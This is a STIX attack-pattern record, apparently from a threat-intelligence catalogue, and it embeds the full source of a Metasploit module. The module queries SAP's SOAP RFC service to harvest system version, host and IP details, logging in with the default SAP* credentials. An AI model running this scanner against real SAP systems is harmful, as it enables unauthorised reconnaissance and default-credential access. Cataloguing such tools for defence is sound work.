{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e6391855-c53b-4784-aa06-2e374dbc70d7",
    "created": "2024-08-14T16:27:01.278098Z",
    "modified": "2024-08-14T16:27:01.278103Z",
    "name": "SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering",
    "description": " This module makes use of the RFC_SYSTEM_INFO Function to obtain the operating system version, SAP version, IP address and other information through the use of the /sap/bc/soap/rfc SOAP service.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_soap_rfc_system_info.rb",
            "external_id": "sap_soap_rfc_system_info.rb"
        },
        {
            "source_name": "reference",
            "url": "https://labs.f-secure.com/tools/sap-metasploit-modules/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy. I'd also like to thank Chris John Riley,\n# Ian de Villiers and Joris van de Vis who have Beta tested the modules and\n# provided excellent feedback. Some people just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering',\n      'Description' => %q{\n        This module makes use of the RFC_SYSTEM_INFO Function to obtain the operating\n        system version, SAP version, IP address and other information through the use of\n        the /sap/bc/soap/rfc SOAP service.\n      },\n      'References' =>\n        [\n          [ 'CVE', '2006-6010' ],\n          [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]\n        ],\n      'Author' =>\n        [\n          'Agnivesh Sathasivam',\n          'nmonkee',\n          'ChrisJohnRiley' # module cleanup / streamlining\n        ],\n      'License' => MSF_LICENSE\n      )\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('CLIENT', [true, 'SAP Client ', '001']),\n        OptString.new('HttpUsername', [true, 'Username', 'SAP*']),\n        OptString.new('HttpPassword', [true, 'Password', '06071992']),\n      ])\n  end\n\n  def extract_field(data, elem)\n    if data =~ /<#{elem}>([^<]+)<\\/#{elem}>/i\n      return $1\n    end\n    nil\n  end\n\n  def report_note_sap(type, data, value)\n    # create note\n    report_note(\n      :host => rhost,\n      :port => rport,\n      :proto => 'tcp',\n      :sname => 'sap',\n      :type => type,\n      :data => data + value\n    ) if data\n    # update saptbl for output\n    @saptbl << [ data, value ]\n  end\n\n  def run_host(ip)\n    client = datastore['CLIENT']\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">'\n    data << '<env:Body>'\n    data << '<n1:RFC_SYSTEM_INFO xmlns:n1=\"urn:sap-com:document:sap:rfc:functions\" env:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">'\n    data << '<CURRENT_RESOURCES xsi:nil=\"true\"></CURRENT_RESOURCES>'\n    data << '<MAXIMAL_RESOURCES xsi:nil=\"true\"></MAXIMAL_RESOURCES>'\n    data << '<RECOMMENDED_DELAY xsi:nil=\"true\"></RECOMMENDED_DELAY>'\n    data << '<RFCSI_EXPORT xsi:nil=\"true\"></RFCSI_EXPORT>'\n    data << '</n1:RFC_SYSTEM_INFO>'\n    data << '</env:Body>'\n    data << '</env:Envelope>'\n    print_status(\"[SAP] #{ip}:#{rport} - sending SOAP RFC_SYSTEM_INFO request\")\n    begin\n      res = send_request_cgi({\n        'uri' => '/sap/bc/soap/rfc',\n        'method' => 'POST',\n        'data' => data,\n        'cookie' => \"sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}\",\n        'ctype' => 'text/xml; charset=UTF-8',\n        'encode_params' => false,\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n        'headers' =>{\n          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n        },\n        'vars_get' => {\n          'sap-client'    => datastore['CLIENT'],\n          'sap-language'  => 'EN'\n        }\n      })\n      if res and res.code != 500 and res.code != 200\n        # to do - implement error handlers for each status code, 404, 301, etc.\n        print_error(\"[SAP] #{ip}:#{rport} - something went wrong!\")\n        return\n      elsif not res\n        print_error(\"[SAP] #{ip}:#{rport} - Server did not respond\")\n        return\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"[SAP] #{ip}:#{rport} - Unable to connect\")\n      return\n    end\n\n    print_status(\"[SAP] #{ip}:#{rport} - Response received\")\n\n    # create table for output\n    @saptbl = Msf::Ui::Console::Table.new(\n      Msf::Ui::Console::Table::Style::Default,\n      'Header' => \"[SAP] SOAP RFC_SYSTEM_INFO\",\n      'Prefix' => \"\\n\",\n      'Postfix' => \"\\n\",\n      'Indent' => 1,\n      'Columns' =>[ \"Key\", \"Value\" ]\n    )\n\n    response = res.body\n\n    # extract data from response body\n    rfcproto = extract_field(response, 'rfcproto')\n    rfcchartyp = extract_field(response, 'rfcchartyp')\n    rfcinttyp = extract_field(response, 'rfcinttyp')\n    rfcflotyp = extract_field(response, 'rfcflotyp')\n    rfcdest = extract_field(response, 'rfcdest')\n    rfchost = extract_field(response, 'rfchost')\n    rfcsysid = extract_field(response, 'rfcsysid')\n    rfcdbhost = extract_field(response, 'rfcdbhost')\n    rfcdbsys = extract_field(response, 'rfcdbsys')\n    rfcsaprl = extract_field(response, 'rfcsaprl')\n    rfcmach = extract_field(response, 'rfcmach')\n    rfcopsys = extract_field(response, 'rfcopsys')\n    rfctzone = extract_field(response, 'rfctzone')\n    rfcdayst = extract_field(response, 'rfcdayst')\n    rfcipaddr = extract_field(response, 'rfcipaddr')\n    rfckernrl = extract_field(response, 'rfckernrl')\n    rfcipv6addr = extract_field(response, 'rfcipv6addr')\n\n    # report notes / create saptbl output\n    report_note_sap('sap.version.release','Release Status of SAP System: ',rfcsaprl) if rfcsaprl\n    report_note_sap('sap.version.rfc_log','RFC Log Version: ',rfcproto) if rfcproto\n    report_note_sap('sap.version.kernel','Kernel Release: ',rfckernrl) if rfckernrl\n    report_note_sap('system.os','Operating System: ',rfcopsys) if rfcopsys\n    report_note_sap('sap.db.hostname','Database Host: ',rfcdbhost) if rfcdbhost\n    report_note_sap('sap.db_system','Central Database System: ',rfcdbsys) if rfcdbsys\n    report_note_sap('system.hostname','Hostname: ',rfchost) if rfchost\n    report_note_sap('system.ip.v4','IPv4 Address: ',rfcipaddr) if rfcipaddr\n    report_note_sap('system.ip.v6','IPv6 Address: ',rfcipv6addr) if rfcipv6addr\n    report_note_sap('sap.instance','System ID: ',rfcsysid) if rfcsysid\n    report_note_sap('sap.rfc.destination','RFC Destination: ',rfcdest) if rfcdest\n    report_note_sap('system.timezone','Timezone (diff from UTC in seconds): ',rfctzone.gsub(/\\s+/, \"\")) if rfctzone\n    report_note_sap('system.charset','Character Set: ',rfcchartyp) if rfcchartyp\n    report_note_sap('sap.daylight_saving_time','Daylight Saving Time: ',rfcdayst) if rfcdayst\n    report_note_sap('sap.machine_id','Machine ID: ',rfcmach.gsub(/\\s+/,\"\")) if rfcmach\n\n    if rfcinttyp == 'LIT'\n      report_note_sap('system.endianness','Integer Format: ', 'Little Endian')\n    elsif rfcinttyp\n      report_note_sap('system.endianness','Integer Format: ', 'Big Endian')\n    end\n\n    if rfcflotyp == 'IE3'\n      report_note_sap('system.float_type','Float Type Format: ', 'IEEE')\n    elsif rfcflotyp\n      report_note_sap('system.float_type','Float Type Format: ', 'IBM/370')\n    end\n\n    # output table\n    print(@saptbl.to_s)\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}